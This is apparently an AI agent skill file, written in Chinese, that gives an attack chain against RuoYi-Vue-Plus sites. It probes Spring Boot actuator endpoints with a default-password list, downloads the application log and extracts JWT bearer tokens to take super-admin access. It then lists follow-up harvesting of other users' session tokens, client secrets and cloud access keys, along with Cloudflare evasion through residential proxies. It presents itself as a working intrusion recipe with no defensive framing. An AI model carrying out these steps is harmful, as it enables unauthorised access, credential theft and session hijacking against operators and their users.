---
name: actuator-logfile-jwt-hijack
description: Use when actuator logfile is open; steal JWT for admin.
---

# Actuator logfile → JWT 劫持

触发：目标有 `/actuator`（RuoYi-Vue-Plus 常见 `/prod-api/actuator`），登录面被 IP 白名单拦死（403 且换 XFF 无效）。

## 链

1. 探端点：
```bash
curl -sk -u 'ruoyi:123456' https://T/prod-api/actuator
curl -sk -u 'ruoyi:123456' https://T/prod-api/actuator/env
```
若 `env` 全 `******`（`show-values=never`）别停，看 index 里有没有 `logfile`。

2. 默认 basic 口令字典（按序，5 发内）：
`ruoyi:123456`、`admin:admin`、`actuator:actuator`、`ruoyi:ruoyi`、`admin:123456`、`spring:spring`

3. 拉日志（关键一步）：
```bash
curl -sk -u 'ruoyi:123456' https://T/prod-api/actuator/logfile -o app.log
```
RuoYi 的 `PlusWebInvokeTimeInterceptor` 会把 **query 参数里的 `Authorization` 头**（`/resource/sse` 长连接）原文写进 INFO 日志。

4. 提 JWT 并直接打后台：
```python
rx = re.compile(r"Bearer ([A-Za-z0-9\-_\.]{40,})")
# 解 payload 看 userName/tenantId/userId，然后
# GET /system/user/list  Header: Authorization: Bearer <tok>
```

5. 验证身份：`GET /prod-api/system/user/getInfo` → `permissions:["*:*:*"]` 即超管。

## 后续收割（RuoYi-Vue-Plus）

- `/monitor/online/list` → 其他在线会话的完整 token（可横切）
- `/system/tenant/list`、`/system/user/list`、`/system/client/list`（含 clientSecret）
- `/resource/oss/config/list` → 云 AK/SK（常是默认演示值，先看再打）
- `/tool/gen/db/list` → 全表清单，定位业务表名
- `/monitor/logininfor/list`、`/monitor/operlog/list` → 运营 IP 画像

## 坑

- `?uid=` 之类保留参数会把会话踢回登录页（破坏性），别在关键会话上乱加。
- 单会话业务（自动下注/自动化平台）会周期性重登把我们的会话顶掉；优先选 `autoOnline=0` 的闲置账号。
- actuator 的 `heapdump` 常被关；`threaddump`/`loggers` 通常还开着，但拿不到明文配置。
- Cloudflare 托管式挑战：机房 IP 过不去，换**住宅/移动代理 + Playwright 真 Chromium**，成功后落 `storage_state` 复用 cookie。
